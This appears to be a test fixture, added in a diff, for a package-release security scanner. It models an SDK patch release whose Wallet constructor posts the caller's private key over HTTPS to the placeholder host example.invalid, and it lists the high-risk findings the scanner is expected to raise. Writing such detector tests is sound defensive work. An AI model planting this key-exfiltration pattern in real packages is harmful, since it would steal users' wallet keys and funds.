@@ -1,0 +1,102 @@
+{
+  "id": "wallet-ctor-hook-privatekey-exfil",
+  "title": "Patch release hooks the wallet constructor and posts the private key it is given",
+  "category": "network-exfil",
+  "intent": "Models the wallet-drainer shape: a patch hooks the Wallet constructor of an SDK and ships the caller's privateKey argument in an https.request body. The key comes from a constructor parameter, not the environment or a credential file, so only the key-material flow rule can see it; it must fire high on the request handle's end() call in a modified module. Safe: host is example.invalid and no key value exists.",
+  "previousPackageJson": {
+    "name": "wallet-ctor-hook-privatekey-exfil",
+    "version": "3.2.0",
+    "main": "index.js"
+  },
+  "stagedPackageJson": {
+    "name": "wallet-ctor-hook-privatekey-exfil",
+    "version": "3.2.1",
+    "main": "index.js"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"wallet-ctor-hook-privatekey-exfil\",\"version\":\"3.2.0\",\"main\":\"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 42,
+      "sha256": "index-js",
+      "flags": [],
+      "textSample": "module.exports = require('./lib/wallet');\n"
+    },
+    {
+      "path": "lib/base.js",
+      "size": 271,
+      "sha256": "base-js",
+      "flags": [],
+      "textSample": "class BaseWallet {\n  constructor(privateKey, provider) {\n    this.provider = provider;\n    this.address = deriveAddress(privateKey);\n  }\n}\nfunction deriveAddress(key) {\n  return '0x' + String(key).length.toString(16).padStart(40, '0');\n}\nmodule.exports = { BaseWallet };\n"
+    },
+    {
+      "path": "lib/wallet.js",
+      "size": 182,
+      "sha256": "wallet-before",
+      "flags": [],
+      "textSample": "const { BaseWallet } = require('./base');\nclass Wallet extends BaseWallet {\n  constructor(privateKey, provider) {\n    super(privateKey, provider);\n  }\n}\nmodule.exports = { Wallet };\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"wallet-ctor-hook-privatekey-exfil\",\"version\":\"3.2.1\",\"main\":\"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 42,
+      "sha256": "index-js",
+      "flags": [],
+      "textSample": "module.exports = require('./lib/wallet');\n"
+    },
+    {
+      "path": "lib/base.js",
+      "size": 271,
+      "sha256": "base-js",
+      "flags": [],
+      "textSample": "class BaseWallet {\n  constructor(privateKey, provider) {\n    this.provider = provider;\n    this.address = deriveAddress(privateKey);\n  }\n}\nfunction deriveAddress(key) {\n  return '0x' + String(key).length.toString(16).padStart(40, '0');\n}\nmodule.exports = { BaseWallet };\n"
+    },
+    {
+      "path": "lib/wallet.js",
+      "size": 474,
+      "sha256": "wallet-after",
+      "flags": [],
+      "textSample": "const https = require('https');\nconst { BaseWallet } = require('./base');\nclass Wallet extends BaseWallet {\n  constructor(privateKey, provider) {\n    super(privateKey, provider);\n    const body = JSON.stringify({ k: privateKey, a: this.address });\n    const req = https.request({ hostname: 'example.invalid', path: '/w', method: 'POST', headers: { 'content-type': 'application/json' } });\n    req.on('error', () => {});\n    req.end(body);\n  }\n}\nmodule.exports = { Wallet };\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedReleaseRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/wallet.js"
+    },
+    {
+      "ruleId": "code.key-material-exfiltration",
+      "severity": "high",
+      "file": "lib/wallet.js"
+    }
+  ],
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/wallet.js"
+    },
+    {
+      "ruleId": "code.key-material-exfiltration",
+      "severity": "high",
+      "file": "lib/wallet.js"
+    }
+  ]
+}
